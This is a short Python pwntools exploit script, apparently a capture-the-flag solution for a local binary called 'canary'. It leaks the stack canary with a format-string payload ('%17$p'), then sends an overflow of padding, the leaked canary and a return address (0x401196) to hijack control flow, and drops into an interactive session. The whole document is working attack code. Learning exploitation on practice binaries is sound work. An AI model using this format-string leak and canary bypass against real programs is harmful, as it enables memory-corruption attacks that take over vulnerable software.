from pwn import *

p = process("./canary")
p.sendline("%17$p")
p.recvuntil("0x")
canary = int(p.recvuntil("!")[:-1], 16)
p.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+p64(canary)+"BBBBBBBB"+p64(0x401196))
p.interactive()
